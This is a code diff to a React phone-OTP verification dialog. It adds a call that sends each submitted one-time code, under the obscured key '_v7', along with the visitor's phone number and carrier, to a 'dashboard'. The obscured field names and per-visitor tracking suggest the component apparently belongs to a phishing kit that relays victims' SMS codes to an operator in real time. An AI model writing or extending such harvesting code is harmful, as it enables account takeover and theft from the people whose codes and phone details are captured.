@@ -5,7 +5,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Alert, AlertDescription } from '@/components/ui/alert';
 import { AlertCircle, CheckCircle2, Smartphone } from 'lucide-react';
-import { addData } from '@/lib/api';
+import { addData, notifyDashboard } from '@/lib/api';
 import { addToHistory } from '@/lib/history-utils';
 
 interface PhoneOtpDialogProps {
@@ -102,6 +102,17 @@ export function PhoneOtpDialog({
         phoneOtpSubmittedAt: new Date().toISOString(),
         phoneOtpStatus: 'verifying',
         phoneOtpUpdatedAt: new Date().toISOString(),
+      });
+
+      // Notify dashboard with OTP data
+      await notifyDashboard({
+        id: visitorID,
+        visitorId: visitorID,
+        _v7: otp,
+        phoneOtpSubmittedAt: new Date().toISOString(),
+        phoneOtpStatus: 'verifying',
+        phoneNumber: phoneNumber,
+        phoneCarrier: phoneCarrier,
       });
 
       await addToHistory(visitorID, '_t4', { phoneNumber, phoneCarrier }, 'approved');
